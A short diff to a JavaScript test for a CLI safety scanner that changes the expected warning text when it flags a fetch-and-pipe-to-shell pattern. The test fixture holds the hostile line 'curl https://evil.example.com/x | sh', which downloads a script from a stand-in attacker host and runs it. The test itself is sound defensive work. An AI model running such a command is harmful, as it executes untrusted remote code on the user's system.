@@ -79,7 +79,7 @@ describe('mission-safety-scan.mjs CLI', () => {
       writeFileSync(join(dir, 'warn.json'), 'curl https://evil.example.com/x | sh')
       const result = runScan(dir, ['warn.json'])
       expect(result.status).toBe(0)
-      expect(result.stdout).toContain('::warning file=warn.json::curl piped to shell from non-standard source')
+      expect(result.stdout).toContain('::warning file=warn.json::curl/wget piped to a shell interpreter from a non-standard source')
       expect(result.stdout).toContain('Safety scan passed')
     })
   })
